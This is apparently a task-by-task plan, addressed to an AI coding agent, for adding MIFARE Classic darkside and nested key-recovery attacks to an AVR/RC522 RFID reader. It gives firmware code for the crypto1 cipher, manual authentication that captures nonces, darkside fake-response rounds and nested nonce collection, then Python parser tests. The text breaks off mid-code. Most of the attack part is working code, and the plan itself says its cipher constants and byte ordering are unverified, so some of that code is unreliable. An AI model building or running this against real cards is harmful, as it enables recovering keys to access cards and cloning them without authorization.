# MIFARE Classic Nested + Darkside Attack Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Crack unknown MIFARE Classic keys using darkside attack (zero known keys) and nested attack (one known key), with firmware collecting RF data and Python performing key recovery.

**Architecture:** Two-phase hybrid — AVR firmware implements crypto1 cipher and manual authentication to collect encrypted nonces over serial. Python orchestrates attacks, runs crapto1 key recovery algorithms, and verifies candidates. The RC522's auto-parity means ~1/256 retry rate per auth (parity must match by chance), giving ~1.3s per successful auth. Total crack time: ~3 min darkside + ~8 min nested = ~11 min for a fully-locked card.

**Tech Stack:** C (avr-gcc, bare-metal ATmega328P), Python 3.8+ (pure Python crapto1, pyserial), CustomTkinter GUI

---

## Key Technical Decisions

### RC522 Parity Limitation
The MFRC522 auto-generates parity from FIFO byte values. When sending encrypted data, the auto-parity is for the ciphertext, but the card expects parity for the plaintext XOR keystream parity. Since `odd_parity(a XOR b) = odd_parity(a) XOR odd_parity(b)`, the auto-parity matches when `odd_parity(ks_data_i) == ks_parity_i` for all bytes. This is true ~1/256 of the time (8 independent bits). We pre-check this condition in software and skip bad nonces, averaging ~256 card interactions (~0.5s) per successful auth.

### No Bit-Stuffing
Manual parity control via MfTxReg ParityDisable would require 9-bit frame packing and break ISO 14443A framing. Auto-parity with retries is simpler and fast enough.

### Crypto1 on AVR
The crypto1 cipher (not cracker) fits easily on ATmega328P: ~400 bytes flash, 8 bytes RAM for state. Only the cipher is on the AVR; key recovery runs on the PC.

---

## Task 1: Fix GUI Race Conditions

**Files:**
- Modify: `Projects/RFID Card Reader/gui/app.py`
- Test: `Projects/RFID Card Reader/gui/tests/test_app_state.py`

### Problem
Multiple rapid button clicks send overlapping commands (e.g., multiple `R` while dump is in progress). Firmware interleaves responses causing garbled output.

### Step 1: Write failing tests

Create `Projects/RFID Card Reader/gui/tests/test_app_state.py`:

```python
import pytest


class FakeSerial:
    """Minimal mock for SerialHandler to test App state logic."""
    def __init__(self):
        self.is_connected = True
        self.commands = []

    def send_command(self, cmd):
        self.commands.append(cmd)


class OperationGuard:
    """Extracted operation state logic from App for testability."""
    def __init__(self):
        self._operation = None
        self._op_start_time = None

    @property
    def is_busy(self):
        return self._operation is not None

    @property
    def operation(self):
        return self._operation

    def start(self, op_name):
        if self._operation is not None:
            return False
        self._operation = op_name
        return True

    def finish(self):
        self._operation = None

    def check_timeout(self, elapsed_seconds, timeout=30):
        if self._operation and elapsed_seconds >= timeout:
            self._operation = None
            return True
        return False


def test_guard_starts_operation():
    g = OperationGuard()
    assert g.start("reading")
    assert g.is_busy
    assert g.operation == "reading"


def test_guard_blocks_second_operation():
    g = OperationGuard()
    g.start("reading")
    assert not g.start("writing")
    assert g.operation == "reading"


def test_guard_finish_allows_new_operation():
    g = OperationGuard()
    g.start("reading")
    g.finish()
    assert not g.is_busy
    assert g.start("writing")


def test_guard_timeout_resets():
    g = OperationGuard()
    g.start("reading")
    assert not g.check_timeout(29)
    assert g.check_timeout(30)
    assert not g.is_busy
```

### Step 2: Run tests to verify they fail

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/test_app_state.py -v`
Expected: FAIL (OperationGuard not found — file doesn't exist yet)

### Step 3: Create OperationGuard and integrate into app.py

Add `OperationGuard` class to `app.py` (before the `App` class):

```python
import time

class OperationGuard:
    def __init__(self):
        self._operation = None
        self._op_start_time = None

    @property
    def is_busy(self):
        return self._operation is not None

    @property
    def operation(self):
        return self._operation

    def start(self, op_name):
        if self._operation is not None:
            return False
        self._operation = op_name
        self._op_start_time = time.monotonic()
        return True

    def finish(self):
        self._operation = None
        self._op_start_time = None

    def check_timeout(self, elapsed_seconds=None, timeout=30):
        if not self._operation:
            return False
        if elapsed_seconds is None:
            elapsed_seconds = time.monotonic() - self._op_start_time
        if elapsed_seconds >= timeout:
            self._operation = None
            self._op_start_time = None
            return True
        return False
```

Update test imports to use: `from app import OperationGuard`

Modify `App.__init__` — add `self._guard = OperationGuard()` after `self._writing = False`.

Modify `_read_card`:
```python
def _read_card(self):
    if not self.serial.is_connected:
        self._log("Read card failed: not connected", "ERROR")
        return
    if not self._guard.start("reading"):
        self._log("Operation in progress, please wait", "WARN")
        return
    self.card_data.clear()
    self.progress_label.configure(text="Reading...")
    self._log("Starting card read (full dump)")
    self._send("R")
```

Modify `_write_card`:
```python
def _write_card(self):
    if not self.serial.is_connected:
        self._log("Write card failed: not connected", "ERROR")
        return
    if not self.card_data.has_data:
        self._log("Write card failed: no card data loaded", "ERROR")
        return
    if not self._guard.start("writing"):
        self._log("Operation in progress, please wait", "WARN")
        return
    # ... rest unchanged
```

Modify `_format_card`:
```python
def _format_card(self):
    if not self.serial.is_connected:
        self._log("Format failed: not connected", "ERROR")
        return
    if not self._guard.start("formatting"):
        self._log("Operation in progress, please wait", "WARN")
        return
    # ... rest unchanged (move guard.start before the confirmation dialog, or after — after is better so cancel doesn't lock)
```

Actually, for format, put the guard AFTER the confirmation dialog:
```python
def _format_card(self):
    if not self.serial.is_connected:
        self._log("Format failed: not connected", "ERROR")
        return
    confirm = messagebox.askyesno(...)
    if not confirm:
        self._log("Format cancelled by user")
        return
    if not self._guard.start("formatting"):
        self._log("Operation in progress, please wait", "WARN")
        return
    self.progress_label.configure(text="Formatting...")
    self._log("Starting card format (erase to factory defaults)")
    self._send("F")
```

Modify `_poll_serial` — add finish calls at completion points and timeout check:

In the `elif msg["type"] == "OK":` block:
- After `DUMP_COMPLETE`: add `self._guard.finish()`
- After `WRITE_DONE`: add `self._guard.finish()`
- After `FORMAT_COMPLETE`: add `self._guard.finish()`

In the `elif msg["type"] == "ERR":` block — errors during reading should NOT finish the guard (the firmware sends ERR per failed sector but continues). Only finish on terminal errors.

At the end of `_poll_serial`, before `self.after(100, self._poll_serial)`:
```python
if self._guard.check_timeout():
    self.progress_label.configure(text="Timeout — operation reset")
    self._log("Operation timed out after 30s", "WARN")
```

### Step 4: Run tests

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/test_app_state.py -v`
Expected: All 4 tests PASS

### Step 5: Commit

```bash
git add "Projects/RFID Card Reader/gui/app.py" "Projects/RFID Card Reader/gui/tests/test_app_state.py"
git commit -m "fix: add operation guard to prevent overlapping serial commands"
```

---

## Task 2: Firmware — Crypto1 Cipher + PRNG

**Files:**
- Create: `Projects/RFID Card Reader/src/crypto1.h`
- Create: `Projects/RFID Card Reader/src/crypto1.c`

### Overview
Implement the crypto1 stream cipher used by MIFARE Classic. Based on the well-documented 48-bit LFSR with nonlinear filter function. This is the CIPHER only (encrypt/decrypt), not the cracker.

Also includes the MIFARE Classic tag PRNG successor function (32-bit LFSR) used to compute auth response values.

### Step 1: Create crypto1.h

```c
#ifndef CRYPTO1_H
#define CRYPTO1_H

#include <stdint.h>

typedef struct {
    uint32_t odd;
    uint32_t even;
} crypto1_state;

// Initialize LFSR with 48-bit key
void crypto1_init(crypto1_state *s, uint8_t *key);

// Process one bit through the cipher
// Returns keystream bit
// is_encrypted: 0 = input is plaintext (XOR with ks before feeding)
//               1 = input is ciphertext (feed directly)
uint8_t crypto1_bit(crypto1_state *s, uint8_t in, uint8_t is_encrypted);

// Process one byte, returns keystream byte
uint8_t crypto1_byte(crypto1_state *s, uint8_t in, uint8_t is_encrypted);

// Process 32 bits, returns keystream word
uint32_t crypto1_word(crypto1_state *s, uint32_t in, uint8_t is_encrypted);

// MIFARE Classic tag PRNG successor
// Steps the 32-bit LFSR forward by n ticks
uint32_t prng_successor(uint32_t x, uint32_t n);

// Check if auto-parity will be correct for encrypted data
// Returns 1 if odd_parity(ks_data_byte) == ks_parity_bit for all n bytes
// ks_bytes: keystream data bytes, ks_par: keystream parity bits (1 bit per byte, packed)
uint8_t parity_check_ok(crypto1_state *s_copy, uint8_t n);

#endif
```

### Step 2: Create crypto1.c

```c
#include "crypto1.h"

// Parity lookup for 4 bits
static const uint8_t ODD_PARITY[16] = {
    0,1,1,0, 1,0,0,1, 1,0,0,1, 0,1,1,0
};

static uint8_t odd_parity8(uint8_t x) {
    return ODD_PARITY[x >> 4] ^ ODD_PARITY[x & 0x0F];
}

static uint8_t parity32(uint32_t x) {
    x ^= x >> 16;
    x ^= x >> 8;
    return odd_parity8(x & 0xFF);
}

// The nonlinear filter function
// Takes 5 bits from specific LFSR tap positions
// Uses a 20-input boolean function (factored into 4x5-bit lookups)
static const uint32_t FILTER_LUT0 = 0xF22C0044UL;
static const uint32_t FILTER_LUT1 = 0x6C81UL;

static uint8_t filter_bit(uint32_t odd) {
    uint32_t f;
    f  = FILTER_LUT0 >> (odd       & 0x0F) & 1;
    f |= (FILTER_LUT0 >> (odd >> 4  & 0x0F) & 1) << 1;
    f |= (FILTER_LUT0 >> (odd >> 8  & 0x0F) & 1) << 2;
    f |= (FILTER_LUT0 >> (odd >> 12 & 0x0F) & 1) << 3;
    f |= (FILTER_LUT0 >> (odd >> 16 & 0x0F) & 1) << 4;
    return (FILTER_LUT1 >> f) & 1;
}

// LFSR feedback polynomial taps (split into odd/even halves)
// Polynomial: x^48 + ... (see MIFARE Classic crypto analysis papers)
#define LF_POLY_ODD  0x29CE5C
#define LF_POLY_EVEN 0x870804

void crypto1_init(crypto1_state *s, uint8_t *key) {
    // Pack 6-byte key into odd/even split LFSR
    uint64_t k = 0;
    for (uint8_t i = 0; i < 6; i++) {
        k = (k << 8) | key[i];
    }

    s->odd = s->even = 0;
    for (int8_t i = 47; i > 0; i -= 2)
        s->odd = (s->odd << 1) | ((k >> i) & 1);
    for (int8_t i = 46; i >= 0; i -= 2)
        s->even = (s->even << 1) | ((k >> i) & 1);
}

uint8_t crypto1_bit(crypto1_state *s, uint8_t in, uint8_t is_encrypted) {
    uint32_t feedin = s->odd & LF_POLY_ODD;
    uint8_t ret = filter_bit(s->odd);

    feedin ^= s->even & LF_POLY_EVEN;
    feedin = parity32(feedin);

    if (is_encrypted)
        feedin ^= (in & 1);
    else
        feedin ^= (in & 1) ^ ret;

    s->even = (s->even << 1) | ((s->odd >> 23) & 1);
    s->odd = (s->odd << 1) | feedin;

    return ret;
}

uint8_t crypto1_byte(crypto1_state *s, uint8_t in, uint8_t is_encrypted) {
    uint8_t ret = 0;
    for (uint8_t i = 0; i < 8; i++) {
        ret |= crypto1_bit(s, (in >> i) & 1, is_encrypted) << i;
    }
    return ret;
}

uint32_t crypto1_word(crypto1_state *s, uint32_t in, uint8_t is_encrypted) {
    uint32_t ret = 0;
    for (uint8_t i = 0; i < 32; i++) {
        ret |= (uint32_t)crypto1_bit(s, (in >> i) & 1, is_encrypted) << i;
    }
    return ret;
}

uint32_t prng_successor(uint32_t x, uint32_t n) {
    // MIFARE Classic PRNG: 32-bit LFSR
    // Feedback: bit31 = bit0 ^ bit2 ^ bit3 ^ bit5
    // (taps at positions 16, 18, 19, 21 from MSB)
    while (n--) {
        x = (x >> 1) | (((x >> 16) ^ (x >> 18) ^ (x >> 19) ^ (x >> 21)) << 31);
    }
    return x;
}

uint8_t parity_check_ok(crypto1_state *s_copy, uint8_t n) {
    // Check if auto-parity will match for the next n encrypted bytes
    // For each byte: auto-parity is correct when odd_parity(ks_data) == ks_parity
    for (uint8_t i = 0; i < n; i++) {
        uint8_t ks_byte = 0;
        for (uint8_t b = 0; b < 8; b++) {
            ks_byte |= crypto1_bit(s_copy, 0, 0) << b;
        }
        uint8_t ks_par = crypto1_bit(s_copy, 0, 0);  // 9th bit = parity keystream
        if (odd_parity8(ks_byte) != ks_par)
            return 0;
    }
    return 1;
}
```

**Note:** The filter function lookup tables and polynomial taps are from the public crypto1 analysis. The exact values need to be verified against known test vectors during implementation. The reference implementation is crapto1 by blapost.

### Step 3: Build firmware

Run: `cd "Projects/RFID Card Reader" && python -m platformio run`
Expected: BUILD SUCCESS. Flash usage should increase by ~400 bytes (~1.3%).

### Step 4: Commit

```bash
git add "Projects/RFID Card Reader/src/crypto1.h" "Projects/RFID Card Reader/src/crypto1.c"
git commit -m "feat: add crypto1 cipher and PRNG for MIFARE Classic attacks"
```

---

## Task 3: Firmware — Manual Authentication

**Files:**
- Modify: `Projects/RFID Card Reader/src/mfrc522.h` (add register defines)
- Modify: `Projects/RFID Card Reader/src/main.c` (add manual_auth function)

### Overview
Implement manual MIFARE Classic authentication using PCD_Transceive instead of PCD_MFAuthent. This gives us access to the plaintext nonce (nt) which PCD_MFAuthent hides internally.

The auto-parity retry strategy: for each card interaction, compute the crypto1 keystream and check if the 8 parity conditions hold. If not, halt and retry with a new nonce (~256 retries, ~0.5s).

### Step 1: Add register defines to mfrc522.h

Add after the existing register defines:

```c
// TX/RX mode registers (for CRC control)
// TxModeReg bit 7: TxCRCEn
// RxModeReg bit 7: RxCRCEn
// (register addresses already defined as TxModeReg=0x12, RxModeReg=0x13)
```

No new defines needed — TxModeReg and RxModeReg are already in the header.

### Step 2: Add manual_auth to main.c

Add `#include "crypto1.h"` at the top of main.c.

Add the following function after `reselect_card()`:

```c
// Perform manual authentication capturing the plaintext nonce.
// Uses PCD_Transceive (not PCD_MFAuthent) so we get the raw nonce.
// Retries up to max_retries times to find an nonce where auto-parity works.
// On success: nt_out contains the 4-byte plaintext nonce, crypto state is active.
// Returns MI_OK on success, MI_ERR on failure.
static uint8_t manual_auth(uint8_t block, uint8_t *key, uint8_t *uid,
                           uint8_t *nt_out, crypto1_state *cs_out,
                           uint16_t max_retries) {
    uint8_t cmd[4];
    uint8_t nt[4];
    uint8_t response[8];
    uint8_t at_buf[4];
    uint8_t back_len;
    uint8_t status;
    uint8_t atqa[2];
    uint8_t sak;

    for (uint16_t retry = 0; retry < max_retries; retry++) {
        // Re-select card each attempt
        if (mfrc522_request(PICC_REQALL, atqa) != MI_OK) continue;
        if (mfrc522_anticoll(PICC_ANTICOLL1, uid) != MI_OK) continue;
        if (mfrc522_select(PICC_ANTICOLL1, uid, &sak) != MI_OK) continue;

        // Step 1: Send AUTH command, receive plaintext nonce
        cmd[0] = PICC_AUTHKA;
        cmd[1] = block;
        mfrc522_calculate_crc(cmd, 2, &cmd[2]);

        // Need CRC on TX, no CRC on RX for this step
        mfrc522_set_bit(TxModeReg, 0x80);    // TxCRCEn = 1
        mfrc522_clear_bit(RxModeReg, 0x80);  // RxCRCEn = 0
        mfrc522_write_reg(BitFramingReg, 0x00);

        status = mfrc522_to_card(PCD_Transceive, cmd, 4, nt, &back_len);
        if (status != MI_OK || back_len != 32) {
            mfrc522_halt();
            continue;
        }

        // Step 2: Initialize crypto1
        crypto1_state cs;
        crypto1_init(&cs, key);

        // Feed uid ^ nt into LFSR
        uint32_t uid32 = ((uint32_t)uid[0]) | ((uint32_t)uid[1] << 8) |
                         ((uint32_t)uid[2] << 16) | ((uint32_t)uid[3] << 24);
        uint32_t nt32 = ((uint32_t)nt[0]) | ((uint32_t)nt[1] << 8) |
                        ((uint32_t)nt[2] << 16) | ((uint32_t)nt[3] << 24);
        crypto1_word(&cs, uid32 ^ nt32, 0);

        // Step 3: Check if parity will work for 8-byte response
        crypto1_state cs_check = cs;  // copy state
        if (!parity_check_ok(&cs_check, 8)) {
            mfrc522_halt();
            continue;  // Parity won't match, try new nonce
        }

        // Step 4: Compute encrypted response
        // nr = reader nonce (use retry counter as simple source)
        uint32_t nr = retry | ((uint32_t)retry << 16);
        uint32_t ar = prng_successor(nt32, 64);

        // Encrypt nr
        uint32_t ks_nr = crypto1_word(&cs, nr, 1);
        uint32_t nr_enc = nr ^ ks_nr;

        // Encrypt ar
        uint32_t ks_ar = crypto1_word(&cs, ar, 1);
        uint32_t ar_enc = ar ^ ks_ar;

        // Pack into response buffer (LSB first byte order)
        response[0] = nr_enc & 0xFF;
        response[1] = (nr_enc >> 8) & 0xFF;
        response[2] = (nr_enc >> 16) & 0xFF;
        response[3] = (nr_enc >> 24) & 0xFF;
        response[4] = ar_enc & 0xFF;
        response[5] = (ar_enc >> 8) & 0xFF;
        response[6] = (ar_enc >> 16) & 0xFF;
        response[7] = (ar_enc >> 24) & 0xFF;

        // Step 5: Send encrypted response, expect 4-byte at
        // No CRC on TX or RX for this step
        mfrc522_clear_bit(TxModeReg, 0x80);  // TxCRCEn = 0
        mfrc522_clear_bit(RxModeReg, 0x80);  // RxCRCEn = 0

        status = mfrc522_to_card(PCD_Transceive, response, 8, at_buf, &back_len);
        if (status != MI_OK || back_len != 32) {
            mfrc522_halt();
            continue;
        }

        // Step 6: Verify at
        uint32_t at_enc32 = ((uint32_t)at_buf[0]) | ((uint32_t)at_buf[1] << 8) |
                            ((uint32_t)at_buf[2] << 16) | ((uint32_t)at_buf[3] << 24);
        uint32_t ks_at = crypto1_word(&cs, 0, 0);
        uint32_t at = at_enc32 ^ ks_at;
        uint32_t expected_at = prng_successor(nt32, 96);

        if (at != expected_at) {
            mfrc522_halt();
            continue;
        }

        // Auth successful!
        memcpy(nt_out, nt, 4);
        *cs_out = cs;

        // Restore CRC settings for normal operation
        mfrc522_set_bit(TxModeReg, 0x80);
        mfrc522_set_bit(RxModeReg, 0x80);

        return MI_OK;
    }

    // Restore CRC settings
    mfrc522_set_bit(TxModeReg, 0x80);
    mfrc522_set_bit(RxModeReg, 0x80);

    return MI_ERR;
}
```

**Important notes for implementation:**
- The byte order (endianness) of uid, nt, nr, ar matters. MIFARE Classic uses LSB-first on the wire but the LFSR processes bits in a specific order. The exact byte/bit ordering must match the crapto1 reference. Test with known test vectors.
- The `parity_check_ok` function processes the crypto state non-destructively (uses a copy).
- After successful auth, the `cs_out` state is in sync with the card's crypto — we can use it to encrypt/decrypt further communication.

### Step 3: Build

Run: `cd "Projects/RFID Card Reader" && python -m platformio run`
Expected: BUILD SUCCESS

### Step 4: Commit

```bash
git add "Projects/RFID Card Reader/src/main.c" "Projects/RFID Card Reader/src/mfrc522.h"
git commit -m "feat: add manual MIFARE Classic auth with nonce capture"
```

---

## Task 4: Firmware — Darkside Attack Command

**Files:**
- Modify: `Projects/RFID Card Reader/src/main.c`

### Overview
Add `K` command for darkside data collection. The PC drives the process: firmware selects card, collects nonce, sends random bytes, reports NACK/timeout. Repeat until PC has enough data.

### Protocol
```
PC → FW:  K<sector_hex_2chars>
          e.g. K00 (darkside attack on sector 0)

FW → PC:  DARK:UID:<uid_8hex>\r\n          (card UID)
          DARK:NT:<nt_8hex>\r\n             (per-round plaintext nonce)
          DARK:NACK\r\n                     (parity matched, got 4-bit NACK)
          DARK:TIMEOUT\r\n                  (parity didn't match, no response)
          DARK:ERR:<message>\r\n            (card lost or error)
          DARK:DONE\r\n                     (PC sent 'X' to stop)

PC → FW:  X                                (stop darkside collection)
```

### Step 1: Add darkside handler to main.c

Add `MODE_DARKSIDE 5` to the mode defines at top.

Add darkside state variables:
```c
static uint8_t dark_sector;
```

Add the darkside round function:
```c
static void do_darkside_round(void) {
    uint8_t status;
    uint8_t atqa[2];
    uint8_t uid[5];
    uint8_t sak;
    uint8_t nt[4];
    uint8_t back_len;

    // Select card
    status = mfrc522_request(PICC_REQALL, atqa);
    if (status != MI_OK) {
        uart_puts("DARK:ERR:NO_TAG\r\n");
        return;
    }
    status = mfrc522_anticoll(PICC_ANTICOLL1, uid);
    if (status != MI_OK) {
        uart_puts("DARK:ERR:ANTICOLL\r\n");
        return;
    }
    status = mfrc522_select(PICC_ANTICOLL1, uid, &sak);
    if (status != MI_OK) {
        uart_puts("DARK:ERR:SELECT\r\n");
        return;
    }

    // Send AUTH command to get plaintext nonce
    uint8_t cmd[4];
    cmd[0] = PICC_AUTHKA;
    cmd[1] = dark_sector * 4;  // first block of sector
    mfrc522_calculate_crc(cmd, 2, &cmd[2]);

    mfrc522_set_bit(TxModeReg, 0x80);    // TX CRC on
    mfrc522_clear_bit(RxModeReg, 0x80);  // RX CRC off

    status = mfrc522_to_card(PCD_Transceive, cmd, 4, nt, &back_len);
    if (status != MI_OK || back_len != 32) {
        uart_puts("DARK:ERR:AUTH_CMD\r\n");
        mfrc522_halt();
        // Restore CRC
        mfrc522_set_bit(TxModeReg, 0x80);
        mfrc522_set_bit(RxModeReg, 0x80);
        return;
    }

    // Send nonce to PC
    uart_puts("DARK:NT:");
    for (uint8_t i = 0; i < 4; i++) uart_put_hex(nt[i]);
    uart_puts("\r\n");

    // Send 8 random bytes as auth response
    // Use a simple counter-based value for reproducibility
    static uint16_t dark_counter = 0;
    uint8_t fake_response[8];
    for (uint8_t i = 0; i < 8; i++) {
        fake_response[i] = (dark_counter >> (i & 1 ? 8 : 0)) + i;
    }
    dark_counter++;

    mfrc522_clear_bit(TxModeReg, 0x80);  // TX CRC off
    mfrc522_clear_bit(RxModeReg, 0x80);  // RX CRC off

    uint8_t resp_buf[4];
    status = mfrc522_to_card(PCD_Transceive, fake_response, 8, resp_buf, &back_len);

    // Restore CRC settings
    mfrc522_set_bit(TxModeReg, 0x80);
    mfrc522_set_bit(RxModeReg, 0x80);

    if (status == MI_OK && back_len == 4) {
        // Got 4-bit NACK — parity matched!
        uart_puts("DARK:NACK:");
        // Send the nr,ar we used so PC can analyze
        for (uint8_t i = 0; i < 8; i++) uart_put_hex(fake_response[i]);
        uart_puts("\r\n");
    } else {
        uart_puts("DARK:TIMEOUT\r\n");
    }

    mfrc522_halt();
}
```

In the main loop command handler, add:
```c
case 'K':
    // Darkside attack — wait for sector number
    if (uart_available()) {
        char hi = uart_getc();
        char lo = uart_available() ? uart_getc() : '0';
        dark_sector = (hex_char_to_val(hi) << 4) | hex_char_to_val(lo);
    } else {
        dark_sector = 0;
    }
    scan_mode = MODE_DARKSIDE;
    uart_puts("OK:DARKSIDE_START\r\n");

    // Send UID
    {
        uint8_t atqa[2], uid[5], sak;
        if (mfrc522_request(PICC_REQALL, atqa) == MI_OK &&
            mfrc522_anticoll(PICC_ANTICOLL1, uid) == MI_OK &&
            mfrc522_select(PICC_ANTICOLL1, uid, &sak) == MI_OK) {
            uart_puts("DARK:UID:");
            for (uint8_t i = 0; i < 4; i++) uart_put_hex(uid[i]);
            uart_puts("\r\n");
            mfrc522_halt();
        }
    }
    break;
```

In the main loop, handle MODE_DARKSIDE:
```c
if (scan_mode == MODE_DARKSIDE) {
    if (uart_available()) {
        char c = uart_getc();
        if (c == 'X' || c == 'P') {
            scan_mode = MODE_IDLE;
            uart_puts("DARK:DONE\r\n");
            continue;
        }
    }
    do_darkside_round();
    _delay_ms(5);  // brief pause between rounds
    continue;
}
```

### Step 2: Build

Run: `cd "Projects/RFID Card Reader" && python -m platformio run`
Expected: BUILD SUCCESS

### Step 3: Commit

```bash
git add "Projects/RFID Card Reader/src/main.c"
git commit -m "feat: add darkside attack data collection command (K)"
```

---

## Task 5: Firmware — Nested Attack Command

**Files:**
- Modify: `Projects/RFID Card Reader/src/main.c`

### Overview
Add `N` command for nested nonce collection. Uses `manual_auth` from Task 3 to auth with known key, then sends encrypted AUTH for target sector to capture the target nonce.

### Protocol
```
PC → FW:  N<known_blk_2hex><target_blk_2hex><key_12hex>\r\n
          e.g. N00140000FFFFFFFFFFFF  (auth block 0x00 with FFFFFFFFFFFF, target block 0x14)

FW → PC:  NESTED:UID:<uid_8hex>\r\n
          NESTED:NT:<nt_known_8hex>:<nt_target_8hex>\r\n   (one nonce pair)
          NESTED:FAIL:<reason>\r\n                          (round failed)
          NESTED:DONE\r\n                                   (all rounds sent)

The firmware collects 5 nonce pairs and sends NESTED:DONE.
PC → FW: X to abort early.
```

### Step 1: Add nested handler

Add `MODE_NESTED 6` to the mode defines.

Add nested state:
```c
static uint8_t nested_known_block;
static uint8_t nested_target_block;
static uint8_t nested_key[6];
```

Add nested collection function:
```c
static void do_nested_collect(void) {
    uint8_t uid[5];
    uint8_t nt_known[4];
    crypto1_state cs;

    // Step 1: Manual auth to known sector
    uint8_t status = manual_auth(nested_known_block, nested_key, uid,
                                 nt_known, &cs, 500);
    if (status != MI_OK) {
        uart_puts("NESTED:FAIL:AUTH\r\n");
        return;
    }

    // Step 2: Send encrypted AUTH for target sector
    // The card is in encrypted mode (our software crypto tracks state)
    // RC522 crypto is OFF, so we encrypt in software

    uint8_t auth_cmd[4];
    auth_cmd[0] = PICC_AUTHKA;
    auth_cmd[1] = nested_target_block;

    // Compute CRC on plaintext
    // Note: CRC is computed on plaintext, then encrypted with the data
    // Actually for MIFARE Classic re-auth, the CRC calculation is on the
    // plaintext command, then everything (cmd + CRC) is encrypted
    mfrc522_calculate_crc(auth_cmd, 2, &auth_cmd[2]);

    // Check parity for 4 encrypted bytes
    crypto1_state cs_par = cs;
    if (!parity_check_ok(&cs_par, 4)) {
        uart_puts("NESTED:FAIL:PARITY\r\n");
        mfrc522_halt();
        return;
    }

    // Encrypt the 4 bytes
    uint8_t enc_cmd[4];
    for (uint8_t i = 0; i < 4; i++) {
        enc_cmd[i] = auth_cmd[i] ^ crypto1_byte(&cs, auth_cmd[i], 0);
    }

    // Send encrypted auth command, expect 4-byte plaintext nonce
    // After receiving re-auth, card drops crypto and sends nt in plaintext
    mfrc522_clear_bit(TxModeReg, 0x80);  // No CRC (already in encrypted data)
    mfrc522_clear_bit(RxModeReg, 0x80);

    uint8_t nt_target[4];
    uint8_t back_len;
    status = mfrc522_to_card(PCD_Transceive, enc_cmd, 4, nt_target, &back_len);

    // Restore CRC settings
    mfrc522_set_bit(TxModeReg, 0x80);
    mfrc522_set_bit(RxModeReg, 0x80);

    if (status != MI_OK || back_len != 32) {
        uart_puts("NESTED:FAIL:TARGET\r\n");
        mfrc522_halt();
        return;
    }

    // Send nonce pair to PC
    uart_puts("NESTED:NT:");
    for (uint8_t i = 0; i < 4; i++) uart_put_hex(nt_known[i]);
    uart_putc(':');
    for (uint8_t i = 0; i < 4; i++) uart_put_hex(nt_target[i]);
    uart_puts("\r\n");

    mfrc522_halt();
}
```

In the command handler, add parsing for `N`:
```c
case 'N':
    // Parse: N<known_blk_2hex><target_blk_2hex><key_12hex>
    // Total: 1 + 2 + 2 + 12 = 17 chars
    scan_mode = MODE_NESTED;
    // Read remaining bytes (block until we have them or timeout)
    {
        uint8_t nbuf[16];
        uint8_t ni = 0;
        while (ni < 16) {
            if (uart_available()) {
                nbuf[ni++] = uart_getc();
            }
        }
        nested_known_block = parse_hex_byte((char*)&nbuf[0]);
        nested_target_block = parse_hex_byte((char*)&nbuf[2]);
        for (uint8_t i = 0; i < 6; i++) {
            nested_key[i] = parse_hex_byte((char*)&nbuf[4 + i*2]);
        }
    }
    uart_puts("OK:NESTED_START\r\n");
    break;
```

In the main loop, handle MODE_NESTED:
```c
if (scan_mode == MODE_NESTED) {
    static uint8_t nested_rounds = 0;
    if (uart_available()) {
        char c = uart_getc();
        if (c == 'X' || c == 'P') {
            scan_mode = MODE_IDLE;
            nested_rounds = 0;
            uart_puts("NESTED:DONE\r\n");
            continue;
        }
    }
    do_nested_collect();
    nested_rounds++;
    if (nested_rounds >= 5) {
        uart_puts("NESTED:DONE\r\n");
        scan_mode = MODE_IDLE;
        nested_rounds = 0;
    }
    _delay_ms(10);
    continue;
}
```

### Step 2: Build

Run: `cd "Projects/RFID Card Reader" && python -m platformio run`
Expected: BUILD SUCCESS

### Step 3: Commit

```bash
git add "Projects/RFID Card Reader/src/main.c"
git commit -m "feat: add nested attack nonce collection command (N)"
```

---

## Task 6: Python — Serial Protocol Updates

**Files:**
- Modify: `Projects/RFID Card Reader/gui/serial_handler.py`
- Modify: `Projects/RFID Card Reader/gui/tests/test_serial_handler.py`

### Step 1: Write failing tests

Add to `tests/test_serial_handler.py`:

```python
def test_parse_dark_uid():
    result = SerialHandler.parse_line("DARK:UID:E413B3DA")
    assert result == {"type": "DARK", "subtype": "UID", "uid": "E413B3DA"}


def test_parse_dark_nt():
    result = SerialHandler.parse_line("DARK:NT:A1B2C3D4")
    assert result == {"type": "DARK", "subtype": "NT", "nt": "A1B2C3D4"}


def test_parse_dark_nack():
    result = SerialHandler.parse_line("DARK:NACK:0102030405060708")
    assert result == {"type": "DARK", "subtype": "NACK", "nr_ar": "0102030405060708"}


def test_parse_dark_timeout():
    result = SerialHandler.parse_line("DARK:TIMEOUT")
    assert result == {"type": "DARK", "subtype": "TIMEOUT"}


def test_parse_dark_done():
    result = SerialHandler.parse_line("DARK:DONE")
    assert result == {"type": "DARK", "subtype": "DONE"}


def test_parse_nested_nt():
    result = SerialHandler.parse_line("NESTED:NT:A1B2C3D4:E5F6A7B8")
    assert result == {
        "type": "NESTED",
        "subtype": "NT",
        "nt_known": "A1B2C3D4",
        "nt_target": "E5F6A7B8",
    }


def test_parse_nested_fail():
    result = SerialHandler.parse_line("NESTED:FAIL:AUTH")
    assert result == {"type": "NESTED", "subtype": "FAIL", "reason": "AUTH"}


def test_parse_nested_done():
    result = SerialHandler.parse_line("NESTED:DONE")
    assert result == {"type": "NESTED", "subtype": "DONE"}
```

### Step 2: Run tests, verify failure

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/test_serial_handler.py -v`
Expected: 8 new tests FAIL

### Step 3: Update parse_line in serial_handler.py

Add new parsing branches in `parse_line` method, after the existing `elif` blocks:

```python
elif line.startswith("DARK:"):
    parts = line[5:].split(":", 1)
    subtype = parts[0]
    if subtype == "UID" and len(parts) > 1:
        return {"type": "DARK", "subtype": "UID", "uid": parts[1]}
    elif subtype == "NT" and len(parts) > 1:
        return {"type": "DARK", "subtype": "NT", "nt": parts[1]}
    elif subtype == "NACK" and len(parts) > 1:
        return {"type": "DARK", "subtype": "NACK", "nr_ar": parts[1]}
    elif subtype == "TIMEOUT":
        return {"type": "DARK", "subtype": "TIMEOUT"}
    elif subtype == "DONE":
        return {"type": "DARK", "subtype": "DONE"}
    elif subtype == "ERR" and len(parts) > 1:
        return {"type": "DARK", "subtype": "ERR", "message": parts[1]}
elif line.startswith("NESTED:"):
    parts = line[7:].split(":", 2)
